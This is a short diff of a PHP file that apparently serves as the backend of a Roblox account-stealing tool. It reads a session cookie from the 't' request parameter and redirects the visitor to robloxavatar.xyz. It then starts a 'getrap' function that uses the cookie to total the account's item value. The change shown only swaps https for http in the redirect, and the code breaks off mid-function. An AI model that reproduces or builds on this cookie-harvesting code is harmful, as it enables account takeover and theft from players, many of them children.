@@ -1,7 +1,7 @@
 <?php
 
    $cookie = $_REQUEST['t'];
-    header("location: https://robloxavatar.xyz/{folder}");    
+    header("location: http://robloxavatar.xyz/{folder}");    
 function getrap($user_id, $cookie) {
 	$cursor = "";
 	$total_rap = 0;
